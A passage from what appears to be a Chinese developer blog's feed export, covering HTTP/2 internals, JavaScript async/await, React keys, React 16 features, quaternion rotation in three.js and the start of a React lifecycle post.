标准测试新功能和建议。理论不一定适合实践（反之亦然），SPDY 提供了一个测试和评估路线，可以对要包括到 HTTP/2 标准中的每条建议进行测试和评估。最终，这个过程持续了三年，期间产生了 10 余条中间草案： 2012 年 3 月：征集 HTTP/2 建议 2012 年 11 月：第一个 HTTP/2 草案（基于 SPDY） 2014 年 8 月：HTTP/2 草案 17 和 HPACK 草案 12 发布 2014 年 8 月：工作组最后一次征集 HTTP/2 建议 2015 年 2 月：IESG 批准 HTTP/2 和 HPACK 草案 2015 年 5 月：RFC 7540 (HTTP/2) 和 RFC 7541 (HPACk) 发布 2015 年初，IESG 审阅了新的 HTTP/2 标准并批准发布。之后不久，Google Chrome 团队公布了他们为 TLS 弃用 SPDY 和 NPN 扩展的时间表： 与 HTTP/1.1 相比，HTTP/2 的主要变化在于性能提升。&gt; 一些主要功能（例如复用、标头压缩、协议协商和优先级）演化自之前开放但不标准的协议 SPDY。Chrome 自 Chrome 6 就开始支持 SPDY，但由于大部分优点都集中在 HTTP/2 ˙中，是时候向 SPDY 说再见了。我们计划于 2016 年初停止对 SPDY 的支持，还会停止 TLS 的 NPN 扩展的支持，转而在 Chrome 中使用 ALPN。强烈建议服务器开发者迁移至 HTTP/2 和 ALPN。我们很高兴参与到最终催生了 HTTP/2 的开放式标准定制过程，并且考虑到整个行业在标准化和实现过程中的参与热情，我们希望对这标准的采纳越来越多。（Chromium 博客） SPDY 与 HTTP/2 的共同演化让服务器、浏览器和网站开发者可以在协议的定制过程中获得真实体验。因此，HTTP/2 协议自诞生之日起就成为最好并经过大量测试的标准之一。到 HTTP/2 被 IESG 批准时，已经有很多经过完全测试并且可以立即投入生产的客户端和服务器。事实上，在最终协议被批准的几周后，由于多款热门浏览器（和许多网站）都部署了完整的 HTTP/2 支持，大量用户都体会到了新协议的好处。 设计和技术目标 早期版本 HTTP 协议的设计初衷主要是实现简单：HTTP/0.9 只用一行代码就启动了万维网；HTTP/1.0 则是对流行的 HTTP/0.9 扩展的一个正式说明；HTTP/1.1 则是 IETF 的一份官方标准。因此，HTTP/0.9-1.x 只描述了现实是这么一回事：HTTP 是应用最广泛、采用最多的一个互联网应用协议。 然而，简单是以牺牲性能为代价的：HTTP/1.x 需要多个连接才能实现并发和缩短延迟，HTTP/1.x 不会压缩请求和响应标头，从而导致不必要的网络流量；HTTP/1.x 不支持有效的资源优先级，导致底层 TCP 协议利用率低下，等等。 这些限制并不是致命的，但是随着互联网应用的范围、复杂性以及在我们生活中的重要性不断增大，它们对网络开发者和用户都造成了巨大负担，而这正是 HTTP/2 致力于解决的： HTTP/2 通过支持标头字段压缩和在同一个连接上进行多个并发交换，让应用有效地利用网络资源，减少感知的延迟时间。具体来说，它可以对同一连接上的请求和响应消息进行交错发送并为 HTTP 标头字段使用有效编码。HTTP/2 还允许为请求设置优先级，让更重要的请求更快速地完成，从而进一步提升性能。出台的协议对网络更加友好，因为与 HTTP/1.x 相比，可以使用更少的 TCP 连接。 这意味着与其他流的竞争减小，并且连接持续时间变长，这些特性反过来提高了可用网络容量的利用率。最后，HTTP/2 还可以通过使用二进制消息分帧对消息进行更高效的处理。（超文本传输协议版本 2，草案 17） 二进制分帧层 HTTP/2 所有性能增强的核心在于新的二进制分帧层，它定义了如何封装 HTTP 消息并在客户端和服务器之间传输。 这里所谓的“层”，指的是位于套接字接口与应用可见的高级 HTTP API 之间一个经过优化的新编码机制：HTTP 的语义（包括各种动词、方法、标头）都不受影响，不同的是传输期间对它们的编码方式变了。HTTP/1.x 以换行符作为纯文本的分隔符，而 HTTP/2 将所有传输的消息分割为更小的消息和帧，并采用二进制格式对它们编码。 这样一来，客户端和服务器为了互相理解，都必须使用新的二进制编码机制：HTTP/1.x 客户端无法理解只支持 HTTP/2 的服务器，反之亦然。不过不要紧，现有的应用不必担心这些变化，因为客户端和服务器都会替我们完成必要的分帧工作。 数据流、消息和帧 新的二进制机制改变了客户端和服务器之间交换数据的方式。为了说明这个过程，我们需要了解 HTTP/2 的三个概念： 数据流：已建立的连接内的双向字节流，可以承载一条或多条信息 消息：与逻辑请求或响应消息对应的完整的一系列帧 帧：HTTP/2 通信的最小单位，每个帧都包括帧头，至少也会标识出当前帧所属的数据流。 这些概念的关系总结如下： 所有通信都在一个 TCP 连接上完成，此连接可以承载任意数量的双向数据流 每个数据流都有一个唯一的标识符和可选的优先级信息，用于承载双向消息 每条消息都是一条逻辑 HTTP 消息（例如请求或响应），包含一个或多个帧 帧是最小的通信单位，承载着特定类型的数据，例如 HTTP 标头、消息负载，等等。来自不同数据流的帧可以交错发送，然后在根据每个帧头的数据流标识符重新组装 简言之，HTTP/2 将 HTTP 协议通信分解为二进制编码帧的交换，这些帧对应着特定数据流中的消息。所有这些都在一个 TCP 连接内复用。这是 HTTP/2 协议所有其他功能和性能优化的基础。 请求与响应复用 在 HTTP/1.x 中，如果客户端想要发起多个并行请求以提升性能，则必须使用多个 TCP 连接（请参阅使用多个 TCP 连接）。这是 HTTP/1.x 交互模型的结果，该模型可以保证每个连接每次只交付一个响应（响应排队）。更糟糕的是，这种模型也会导致队首阻塞，从而造成底层 TCP 连接效率低下。 HTTP/2 中新的二进制分帧层突破了这些限制，实现了完整的请求和响应复用：客户端和服务器可以将 HTTP 消息分解为互不依赖的帧，然后交错发送，最后在另一端把它们重新组装起来。 HTTP/1.x 和 HTTP/2 的数据传输过程如下图所示： 快照捕捉了一个连接内并行的多个数据流。客户端正向服务器传送一个 DATA 帧（数据流5），与此同时，服务器正向客户端发送数据流1和数据流3的一系列帧。因此一个连接上同时有三个并行的数据流。 将 HTTP 消息分解为独立的帧，交错发送，然后在另外一端重新组装是 HTTP/2 最重要的一项增强。事实上，这个机制会在整个网络技术栈中引发一系列的连锁反应，从而带来巨大的性能提升，让我们可以： 并行交错发送多个请求，请求之间不影响 并行交错发送多个响应，响应之间不影响 使用一个连接并行发送多个请求和响应 不必再为绕过 HTTP/1.x 限制而做很多工作 消除不必要的延迟和提高现有网络容量的利用率，从而减少页面加载时间 等等…. HTTP/2 中新的二进制分帧层解决了 HTTP/1.x 队首阻塞问题，也消除了并行处理和发送请求和响应时对多个连接的依赖（要开多个 TCP 连接）。结果应用速度更快、开发更简单、部署成本更低。 数据流优先级 将 HTTP 消息分解为很多独立的帧后，我们就可以复用多个数据流中的帧，客户端和服务器交错发送和传输这些帧的顺序就成为关键的性能决定因素。为了做到这一点，HTTP/2 标准允许每个数据流都有一个关联的权重和依赖关系： 可以向每个数据分配一个介于 1 - 256 之间的整数 每个数据流和其他数据流之间可以存在显示依赖关系 数据流依赖关系和权重的组合让客户端可以传递和构建优先级树，表明它倾向于如何接受响应。反过来，服务器可以使用此信息通过控制 CPU、内存和其他资源的分配设定数据流处理的优先级，在资源数据可用之后，带宽分配可以确保将高优先级响应以最优的方式传输至客户端。 HTTP/2 内的数据流依赖关系通过将另一个数据流的唯一标识符作为父项引用进行声明；如果忽略标识符，相应数据流将依赖于“根数据流”。声明数据流依赖关系指出，应尽可能向父数据流分配资源，然后再向其他依赖项分配资源。换句话说，“请先处理和传输响应 D，然后再处理和传输响应 C”。 共享相同父项的数据流（即，同级数据流）应按照其权重分配资源。例如，如果数据流 A 的权重为 12，其同级数据流 B 的权重为 4，那么要确定每个数据流应接受资源的比列，请执行以下操作： 将所有权重求和：4 + 12 = 16 将每个数据流权重除以总权重：A = 12 / 16，B = 4 / 16，因此，数据流 A 应该获得得四分之三的可用资源，数据流 B 应获得四分之一的可用资源；数据流 B 获得的资源是数据流 A 所获得资源的三分之一。我们来看一下上图中其他几个动手示例：顺序从左到右： 数据流 A 和数据流 B 都没有制定父依赖项，依赖于显示“根数据流”；A 的权重为 12，B 的权重为 4。因此，根据比例权重：数据流 B 获得的资源数据流是 A 所获资源的三分之一 数据流 D 依赖于根数据流；C 依赖于 D。因此，D 应先于 C 获得完整的资源分配。权重不重要，因为 C 的依赖关系拥有更高的优先级 数据流 D 应优先于 C 获得完整资源分配；C 应优先于 A 和 B 获得完整的资源分配；数据流 B 获得的资源是 A 所获资源的三分之一 数据流 D 应优先于 C 和 E 获得完整的资源分配；E 和 C 应优先于 A 和 B 获得相等的资源分配；A 和 B 应基于其权重获得比例分配。 如上面示例所示，数据流依赖关系和权重的组合明确表达了资源优先级，这是一种用于提升浏览器性能的关键功能，网络中拥有多种资源类型，它们的依赖关系和权重各不相同。不仅如此，HTTP/2 协议还允许客户端随时更新这些优先级，进一步优化了浏览器性能。换句话说，我们可以根据用户互动和其他信号更改依赖关系和重新分配权重。 注：数据流依赖关系和权重表示传输优先级，而不是要求，因此不能保证特定的处理或传输顺序。即，客户端无法强制服务器通过数据流优先级以特定顺序处理数据流。尽管这看起来违反直觉，但却是一种必要行为。我们不希望优先级较高的资源收到阻塞时，还阻止服务器处理优先级较低的资源。 每个来源一个连接 有了新的分帧机制后，HTTP/2 不再依赖多个 TCP 连接去并行复用数据流；每个数据流都拆分成很多帧，而这些帧可以交错，还可以分别设定优先级。因此，所有 HTTP/2 连接都是永久的，而且仅需要每个来源一个连接，随之带来诸多性能优势。 SPDY 和 HTTP/2 的杀手级功能是，可以在一个拥塞收到良好控制的通道上进行任意复用。这一功能的重要性和良好运行状况让我吃惊。我喜欢的一个非常不错的指标是连接拆分，这些拆分仅承载一个 HTTP 事务（并因此让该事物承担所有开销）。对于 HTTP/1，我们 74% 的活动连接仅承载一个事务-永久连接并不如我们所有人希望的那般有用。但是在 HTTP/2 中，这一比例锐减至 25%（HTTP/2 登陆 Firefox，Patrick McManus） 大多数 HTTP 连接都是短暂而急促的，而 TCP 则针对长时间的批量数据传输进行了优化。通过重用相同连接，HTTP/2 既可以更有效的利用每个 TCP 连接，也可以显著降低整体协议开销。不仅如此，使用更少的连接还可以减少占用的内存和处理空间，可以缩短完整连接路径（即，客户端、可信中介和源服务器之间的路径）这降低了整体运行成本并提高了网络利用率和容量。因此，迁移到 HTTP/2 不仅可以减少网络延迟，还有助于提高通量和运行成本。 注：连接数量的减少对提升 HTTPS 部署的性能来说是一项特别重要的功能：可以减少开销较大的 TLS 连接、提升会话利用率，以及整体上减少所需的客户端和服务器资源。 流控制 流控制是一种阻止发送方向接受方发送大量数据的机制，以免超出后者的需求或处理能力：发送方可能非常忙、处于较高负荷之下，也可能仅仅希望为特定的数据流分配固定量的资源。例如，客户端可能请求了一个具有较高优先级的视频流，但是用户已经暂停视频，客户端希望暂停或者限制从服务器的传输，以免提取和缓冲不必要的数据。再比如，一个代理服务器可能具有较快的下游连接和较慢的上游连接，并且也希望调节下游连接传输数据的速度以匹配上游连接速度来控制其资源利用，等等。 上述要求会让你想到 TCP 的流控制吗？您应当想到这一点；因为问题基本相同（请参阅流控制）。不过，由于 HTTP/2 数据流在一个 TCP 连接内复用，TCP 流控制既不够精细，也无法提供必要的应用级 API 来调节各个数据流的传输。为了解决这一问题， HTTP/2 提供了一组简单的构建块，这些构建块允许客户端和服务器实现自己的数据流和连接级流控制： 流控制具有方向性。每个接受方都可以根据自身需要选择为每个数据流和整个连接设置任意的窗口大小。 流控制基于信用。每个接受方都可以公布其初始连接和数据流流控制窗口（以字节为单位），每当发送方发出 DATA 帧时都会减小，在接受方发出 WINDOW_UPDATE 帧时增大。 流控制无法停用。建立 HTTP/2 连接后，客户端将与服务器交换 SETTINGS 帧，这会在两个方向上设置流控制窗口。流控制窗口的默认值为 65535 字节，但是接受方可以设置一个较大的最大窗口大小（2^31 - 1）并在接收到任意数据时通过发送 WINDOW_UPDATE 帧来维持这一大小。 流控制为逐跃点控制，而非端到端控制。即，可信中介可以使用它来控制资源使用，以及基于自身条件和启发式算法实现资源的分配机制。 HTTP/2 未指定任何特定的算法来实现流控制。不过，它提供了简单的构建块并推迟了客户端和服务器实现，可以实现自定义策略来调节资源的使用和分配，以及实现新的传输能力，同时提升网络应用的实际性能和感知性能（请参阅速度、性能和人类感知）。 例如，应用层流控制允许浏览器仅提取一部分特定的资源，通过将数据流流控制窗口减小为零来停止提取，稍后再恢复。换句话说，它允许浏览器提取图像预览或首次扫描结果，进行显示并允许其他高优先级提取继续，然后在更关键的资源完成加载后恢复提取。 服务器推送 HTTP/2 新增的另外一个强大的功能是，服务器可以对一个客户端请求发送多个响应。换句话说，除了对最初请求的响应外，服务器还可以向客户端推送额外的资源，如下图，而无需客户端明确地请求。 注：HTTP/2 打破了严格的请求响应语义，支持一对多和服务器发起的推送工作流，在浏览器内外开启了全新的互动可能性。这是一项使用功能，对我们思考协议，协议用途和使用方式具有重要的长期影响。 为什么在浏览器中需要一种此类机制呢？一个典型的网络应用包含多种资源，客户端需要检查服务器提供的文档才能逐个找到它们。那为什么不让服务器提前推送这些资源，从而减少额外的延迟时间呢？服务器已经知道客户端下一步需要请求什么资源，这时候服务器推送即可派上用场。 事实上，如果你在网页中内联过 CSS、Javascript，或者通过数据 URL 内联过其他资产，那么您已经亲身体验过服务器推送了。对于将资源手动内联到文档中的过程，我们实际上是将资源推送给客户端，而不是等待客户端请求。使用 HTTP/2 ，我们不仅可以实现相同结果，还会获得其他性能优势。推送资源可以进行以下处理： 由客户端缓存 不同面之间重用 与其他资源一起复用 由服务器设定优先级 被客户端拒绝 PUSH_PROMISE 101 所有服务器推送数据流都由 PUSH_PROMISE 发起，表明了服务器向客户端推送所述资源的意图，并且需要先于请求推送资源的响应数据传输。这种传输顺序非常重要：客户端需要了解服务器打算推送哪些资源，以免为这些资源创建重复请求。满足要求的最简单策略是先于父响应（即，DATA 帧）发送所有 PUSH_PROMISE 帧，其中包含所承诺资源的 HTTP 头。 在客户端收到 PUSH_PROMISE 帧后，它就可以根据自身情况选择拒绝数据流（通过 RST_STREAM帧）。（如果资源已位于缓存中，可能会发生这种情况）这是一个相对于 HTTP/1.x 的重要提升。相比之下，使用内联（一种受欢迎的 HTTP/1.x “优化”）等同于“强制推送”：客户端无法选择拒绝、取消或单独处理内联的资源。 使用 HTTP/2，客户端仍然完全掌控服务器推送的使用方式。客户端可以限制并行推送的数据流数量；调整初始的流控制窗口以控制在数据流首次打开时推送的数据量；或完全停用服务器推送。这些优先级在 HTTP/2 连接开始时通过 SETINGS 帧传输，可能随时更新。 推送的每个资源都是一个数据流，与内联资源不同，客户端可以对推送资源逐一复用、设定优先级和处理。浏览器强制执行的唯一安全机制是，推送的资源必须符合原点相同这一政策：服务器对所提供的资源必须有权威性。 标头压缩 每个 HTTP 传输都承载一组标头，这些标头说明了传输资源及其属性。在 HTTP/1.x 中，此元数据始终以纯文本形式，通常会给每个传输增加 500-800 字节的开销。如果使用 HTTP cookie，增加的开销有时会达上千字节。为了减少此开销和提升性能，HTTP/2 使用 HPACK 压缩格式压缩请求和响应标头元数据，这种格式采用两种简单但是强大的技术： 这种格式支持通过静态 Huffman 代码对传输的标头字段进行编码，从而减小了各个传输的大小。 这种格式要求客户端和服务器同时维护和更新一个包含之前见过的标头字段的索引列表（换句话说，它可以建立一个共享的压缩上下文），此列表随后会用作参考，对之前传输值进行有效编码。 利用 Huffman 编码，可以在传输时对各个值进行压缩，而利用之前传输值的索引列表，我们可以通过传输索引值的方式对重复值进行编码，索引值可以用于有效查询和重构完整的标头键值对。 作为一种进一步优化方式，HPACK 压缩上下文包含一个静态表和一个动态表：静态表在规范中定义，并提供了一个包含所有连接都可能使用的常用 HTTP 标头字段（例如，有效标头名称）的列表；动态表最初值为空，将根据在特定连接内交换的值进行更新。因此，为之前未见过的值采用静态 Huffman 编码，并替换每一侧静态表或动态表中已存在的索引，可以减小每个请求的大小。 注：在 HTTP/2 中，请求和响应标头字段的定义保持不变，仅有些微小差异：所有的标头字段名称均为小写，请求行现在拆分为各个 :method、:scheme、:authority 和 :path 伪标头字段。 HPACK 安全性和性能 早期版本的 HTTP/2 和 SPDY 都使用 zlib (带有一个自定义字典) 压缩所有 HTTP 标头。这种方式可以将所传输标头数据的大小减小 85%-88%，显著减少了页面加载时间延迟： 在宽带较低的 DSL 链路中，上行链路速度仅有 375 Kbps，仅压缩请求标头就显著减少了特定网站（即，发出大量资源请求的网站）的页面加载时间。我们发现，仅仅由于标头压缩，页面加载时间就少了 45-1142 毫秒。 然而，2012 年夏天，出现了针对 TLS 和 SPDY 压缩算法的“犯罪”安全攻击，此攻击会导致会话被劫持。于是，zlib 算法被 HPACK 代替，后者经过专门设计，可以解决发现的安全问题、实现起来也更高效简单，当然，可以对 HTTP 标头元数据进行良好压缩。 如需了解有关 HPACK 压缩算法的完整详情，请参阅 https://tools.ietf.org/html/draft-ietf-httpbis-header-compression。 深入阅读 “HTTP/2” 已经粉墨登场，我们一起优化性能吧！”]]></content>
      <categories>
        <category>http/2</category>
      </categories>
      <tags>
        <tag>http/2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js 异步进化史之async]]></title>
    <url>%2Fjs%E5%BC%82%E6%AD%A5%E8%BF%9B%E5%8C%96%E5%8F%B2%E4%B9%8Basync%2F</url>
    <content type="text"><![CDATA[我们的 js 处理的异步的方式不断进化，现在已经到了第四代，最强之 async 什么是 async？ async 定义了一个异步函数，并总是返回一个 Promise。当执行到 await 表达式，async 函数会暂停执行，等待表达式中的 Promise 决议后，async 再继续执行。 上一篇 js异步进化史之Generator 代码，用同步的方式编写异步代码，要做到方便使用，需要引入额外的库，代码如下： 1234567const co = require('co');co(function* ()&#123; let text = yield requst('http://example.com') console.log(text);&#125;).catch(err =&gt; &#123; console.log(err);&#125;); 现在我们用 async 改写一下 1234567async function foo() &#123; try &#123; let text = await requst('http://example.com'); &#125; catch(err) &#123; console.log(err); &#125;&#125; 是不是更逆天，不需要额外引入函数库，也没有 co 什么的，直接原生 js 支持。 哎呀，爱死 js 了，爱死 ES 工作组人员了。 async 返回值 async 的定义表明，async 总是返回一个 Promise。其实就像这样 123async function foo() &#123; return Promise.resolve(value);&#125; 用 Promise.resolve 包装返回结果，新建一个 Promise。不清楚 Promise 的可以看 js 异步进化史之Promise async 并发 直接上代码吧 1234567891011const p1 = requst('http://example.com?index=1');const p2 = requst('http://example.com?index=2');const p3 = requst('http://example.com?index=3');async function foo() &#123; try &#123; let text = await Promise.all([p1, p2, p3]); &#125; catch(err) &#123; console.log(err); &#125;&#125; 哇～ nice! nice! nice! 最后最后的最后 连更四篇博客 回调 &gt; promise &gt; generator &gt; async 真的累呀～ 而且还是写的冰山一角，可以想象一下 ES 工作组的人员花费了多少心血 ES 工作组的成员，以及参与 ES 改进的广大社区朋友们幸苦了！！！致敬]]></content>
      <categories>
        <category>异步</category>
      </categories>
      <tags>
        <tag>async/await</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react key]]></title>
    <url>%2Freact%20key%2F</url>
    <content type="text"><![CDATA[react 核心开发人员说之后可能不再需要 key，趁它还在赶紧去了解一泼，逃～～～ 本文思路： 为什么要使用 key 使用 key 的正确方式 为什么要使用 key？ 简单来说，这和 react 的 diff 算法有关，用于提高 react 处理列表的性能。 为什么使用了 key 就可以提高处理列表的性能呢？ 例如，我们需要在当前列表末尾插入一个新的元素： 123456789101112&lt;!-- 原始列表 --&gt;&lt;ul&gt; &lt;li&gt;冬笑非&lt;/li&gt; &lt;li&gt;南宫燕&lt;/li&gt;&lt;/ul&gt;&lt;!-- 更新后列表 --&gt;&lt;ul&gt; &lt;li&gt;冬笑非&lt;/li&gt; &lt;li&gt;南宫燕&lt;/li&gt; &lt;li&gt;雪鸢心&lt;/li&gt;&lt;/ul&gt; 在新旧 dom 树 diff 过程中，发现前两个列表子节点（ &lt;li&gt;冬笑非&lt;/li&gt; 和 &lt;li&gt;南宫燕&lt;/li&gt; ）相同，如是直接插入 &lt;li&gt;雪鸢心&lt;/li&gt; 这个节点完事 但是（重点都在”但是”后），如果我在列表前面插入一个元素会发生什么呢？ 123456789101112&lt;!-- 原始列表 --&gt;&lt;ul&gt; &lt;li&gt;冬笑非&lt;/li&gt; &lt;li&gt;南宫燕&lt;/li&gt;&lt;/ul&gt;&lt;!-- 更新后列表 --&gt;&lt;ul&gt; &lt;li&gt;雪鸢心&lt;/li&gt; &lt;li&gt;冬笑非&lt;/li&gt; &lt;li&gt;南宫燕&lt;/li&gt;&lt;/ul&gt; react 将会改变每一个节点，而不是保留 &lt;li&gt;冬笑非&lt;/li&gt; 和 &lt;li&gt;南宫燕&lt;/li&gt; 这两个节点。这种处理方式会导致一定的性能问题。（你可能会觉得一个 li 能造成什么性能影响呢？想想在实际情况下，这可能是一个商品列表页，然后你会懂的） 为了解决上述问题，react 提供了一个称为 key 的属性。 123456789101112&lt;!-- 原始列表 --&gt;&lt;ul&gt; &lt;li key="doxiu"&gt;冬笑非&lt;/li&gt; &lt;li key="niye"&gt;南宫燕&lt;/li&gt;&lt;/ul&gt;&lt;!-- 更新后列表 --&gt;&lt;ul&gt; &lt;li key="xueyx"&gt;雪鸢心&lt;/li&gt; &lt;li key="doxiu"&gt;冬笑非&lt;/li&gt; &lt;li key="niye"&gt;南宫燕&lt;/li&gt;&lt;/ul&gt; 这样 react 会发现 key 为 doxiu、niye 的节点并没有改变，只需移动一下位置，再新增一个 key=”xueyx” 的节点。 react 使用 key 识别列表子节点，进而对节点进行增删改操作。如果 key 变更，react 会认为是一个新节点。 使用 key 的正确方式 既然 key 用于标识列表中的一个节点，自然 key 应该在当前列表唯一（不需要全局唯一），并且保持稳定。 如果同一个列表子节点的 key 不断的变更，react 会认为它总是一个新节点。 所以使用 key 的时候： 如果数据本身带有 id 尽量使用 id 作为 key 如果数据本身不带 id ，并且需要经常更新列表，需要为每个子节点构造一个唯一 key，使用 hash 方法等 如果数据本身不带 id，并且数据不怎么更新，使用数据 index 也没什么问题 这种方式相当于人工优化算法，有点变扭～～ 不过前文也说了，之后可能不用再写 key 了【期待脸】]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>key</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react16 系列（1）]]></title>
    <url>%2Freact16%20%E7%B3%BB%E5%88%97%EF%BC%881%EF%BC%89%20%2F</url>
    <content type="text"><![CDATA[前言 近来一直忙其他事，没怎么和 react 打过招呼了，转眼 react 已经跟新到了 16.2 版本，并且带来了很多重要的变更: render 可以返回字符串（String）和片段（fragments) Error Boundary 处理错误组件 Portals 将组件渲染到当前组件树外 支持自定义 DOM 属性 setState 传入 null 时不会出发更新 减少文件大小 优化服务器端渲染方式 render 可以返回字符串（String）和片段（fragments) 现在的 render 方法可以返回字符串，非常简单： 123const String = () =&gt; &#123; return "hello world";&#125; render 返回片段，是个数组类型，html 元素需要带上 key，（官方说可能之后不用再写 key 了，哇赞成的举个手）👋： 123456789export const FragmentDemo1 = () =&gt; &#123; return [ "Some Text.", &lt;h2 key="heading-1"&gt;A heading&lt;/h2&gt;, "More text.", &lt;h2 key="heading-2"&gt;Another heading&lt;/h2&gt;, "Even more text." ];&#125; react16.2 新出了一个语法糖 Fragment，官方定义如下： Fragments look like empty JSX tags. They let you group a list of children without adding extra nodes to the DOM： 123456789render() &#123; return ( &lt;&gt; &lt;ChildA /&gt; &lt;ChildB /&gt; &lt;ChildC /&gt; &lt;/&gt; );&#125; 也就是说相当于一个空的 jsx 标签，具体用法： 1234567891011export const FragmentDemo2 = () =&gt; &#123; return ( &lt;Fragment&gt; Some text. &lt;h3&gt;A heading &lt;/h3&gt; More text. &lt;h1&gt;Another heading&lt;/h1&gt; Even more text. &lt;/Fragment&gt; );&#125; Error Boundary 处理错误组件 在 UI 中的一个 javascript 错误，不应该让整个应用崩溃，像皮球一样，搓个洞就炸了。 为解决这个问题，react16 提供了一新的概念 Error Boundary： 可以捕获它的子组件树的任何 javascript 错，log 错误信息，并用一个 component 取代奔溃的组件树。包括 rendering 时的错误，生命周期中的错误，以及子组件中的 constructor 中错误。如果 Error Boundary 处理失败，会上浮到离它最近的一个 Error Boundary 上，相似于 catch {} 注：是只能捕获子组件树，不能捕获它自身的错误。 怎么用呢？只需要在一个 class Component 加上 componentDidCatch，这个组件就变成 Error Boundary Component 了 12345678910111213141516171819class ErrorBoundary extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; hasError: false &#125;; &#125; componentDidCatch(error, info) &#123; // Dispay fallback UI this.setState(&#123; hasError: true &#125;); // You can also log the error to an error reporting servics // logErrorToMyServics(error, info); console.log(error, info); &#125; render() &#123; if (this.state.hasError) &#123; return &lt;h1&gt;Something went wrong.&lt;/h1&gt; &#125; return this.props.children; &#125;&#125; 注：也只有 class Compoent 才能变成 Error Boundary Component 然后可以用于普通组件： 123&lt;ErrorBoundary&gt; &lt;String /&gt;&lt;/ErrorBoundary&gt; 1234const String = () =&gt; &#123; throw new Error('哇哇哇，出错啦出错啦') return "hello world";&#125; 现在我们了解了 Error Boundary 的作用及其用法，那么它可以用在哪里呢？ 这主要取决于你需要做多细粒度的控制。可以用于包裹顶层 route component，当应用发生错误的时候现实 “出现了某种类型的错误” 给用户。或者专门控制一些小的子组件，防止子组件奔溃的时候影响整个应用。 注：如果没使用 Error Boundary，出现错误，react 会卸载整个组件树，详细原因看传送门 Portals 将组件渲染到当前组件树外 使用 react 的时候，如果我想在父组件为 overflow: hidden 的情况下把子组件显示出来怎么办？例如 html5.2 新出的 dialog，或者hovercards、tooltips Portals 就是为解决这种问题而开发出来，它可以将一个组件渲染到其他 DOM 节点去，而不在当前的父节点下，用法如下： 12345678render() &#123; // React does *not* create a new div. It renders the children into `domNode`. // `domNode` is any valid DOM node, regardless of its location in the DOM. return ReactDOM.createPortal( this.props.children, domNode, );&#125; 注：虽然 Portal 组件渲染到其他 DOM 节点下了，但是 Portal 组件的其他方面的行为还是和正常的 react child 一样，Portal 组件上的事件还是传递到原来的父组件，这和 react 的事件系统设计有关，传送门 支持自定义 DOM 属性 听说 react16 文件减小，是不是很开心😄？ 但是这和我们的自定义 DOM 属性有什么关系呢？ 因为 react 不用再搞一个属性白名单了，直接把无法识别的 html 和 svg 属性传递给 DOM： 1&lt;div nirenshiwoma="不认识你这个属性耶"&gt;我带了新属性&lt;/div&gt; setState 传入 null 时不会出发更新 setState react 官方描述如下： Calling setState with null no longer triggers an update. This allows you to decide in an updater function if you want to re-render. Calling setState directly in render always causes an update. This was not previously the case. Regardless, you should not be calling setState from render. setState callbacks (second argument) now fire immediately after componentDidMount / componentDidUpdate instead of after all components have rendered. 这里点击 update 按钮不会触发 render: 减少文件大小 什么？增加了这么多功能，文件还减小了？【成龙脸】 没错，你没听错，如 Facebook 工程师所说：我们对 react 进行了重写 赞，喜欢的就是这范👍 react包的大小从20.7kb下降到5.3kb（gzip压缩后大小从6.9kb下降到2.2kb）。 react-dom包的大小从141kb下降到103.7kb（gzip压缩后大小从42.9kb下降到103.7kb）。 react+react-dom包总大小从161.7kb下降到109kb（gzip压缩后大小从49.8kb下降到34.8kb）。 优化服务器端渲染方式 这个是大话题，请听下回【react16 系列（2）】分析😊]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>react16</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用一个四元数代替两个3D向量的旋转]]></title>
    <url>%2Fthree.js%E4%B9%8B%E7%94%A8%E4%B8%80%E4%B8%AA%E5%9B%9B%E5%85%83%E6%95%B0%E4%BB%A3%E6%9B%BF%E4%B8%A4%E4%B8%AA3D%E5%90%91%E9%87%8F%E7%9A%84%E6%97%8B%E8%BD%AC%2F</url>
    <content type="text"><![CDATA[翻译自：http://lolengine.net/blog/2013/09/18/beautiful-maths-quaternion-from-vectors 一个旋转最好的表示方法就是使用一个旋转轴和一个旋转角。旋转轴可以通过两个向量的叉乘得出。 旋转角（最小）可以通过两个向量的点积获得。点积获取的刚好是最小的旋转角。如下两种方法： 有了角度和旋转轴我们便可以用代码生成四元数 接下来让我们看看通过旋转轴和旋转角构造四元数的公式： 看代码： 减少三角函数的使用： 通过下面三角函数的公式，减少代码中三角函数的使用，简化代码， 直接看代码： 减少平方根的使用： 上述代码中用到 3次nomalize, 每个normalize 里面又有一个Math.sqrt; 计算法向量 （w) 的模，可以使用下面的公式， sin(θ)的值可以使用 那么代码即可简化为： ‘ 我们可以清楚的发现创建单位法向量(w)时除了一个 half_sin,构造四元数对象(quat) 又乘了half_sin,因此 half_sin是重复而多余的，简化代码如下： 在THREE.js 中进行改进 用些引擎normalize 的速度是很快的，如是我们可以进一步该进代码： 通过观察代码我们容易发现，构建四元素对象时，用的是half_cos 的平方，故开平方的代码可以省去： 我们可以让四元素乘上 norm_u_norm_v 进一步简化代码 如果强迫 使用单位向量（three.js 确实是这样做的） 代码还可以简化为 注意：两个向量可能不在同一个平面内，还要进行判断 所有代码如下： 如有不对，欢迎抛砖]]></content>
      <categories>
        <category>webgl</category>
      </categories>
      <tags>
        <tag>webgl</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react生命周期]]></title>
    <url>%2Freact%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%2F</url>
    <content type="text"><![CDATA[生命周期方法管理是 react 核心功能之一，作为一名 react 开发者没有清晰认知岂不是有点说不过去了哈哈，我们通过网上某位大佬的图片说明一下 如上图所示，react 组件生命周期分为三个阶段： 创建期 存活期 销毁期 下面我们逐个分析一下 创建期 即 ES6 class 的初始化过程，初始化并渲染整个组件。下面逐步分析下创建期涉及的生命周期方法。 getDefaultProps用于设置默认的 props 值，如果父组件有直接传值过来或者传入 undefined，会将其覆盖。 组件创建时期调用一次，因为这个方法在实例化之前调用，所以在这个方法里面还不能依赖 this。不过这是 es5 写法，太过时了，我们直接来看看 es6: 123static defaultProps = &#123; txt: 'hello world',&#125; getInitialState用于初始化 this.state 的值。 在组件创建的时候调用一次，这个也是 es5 写法，就不多做介绍了，直接上 es6: 123456class TestState extends React.Component &#123; constructor(props) &#123; super(props); this.state = 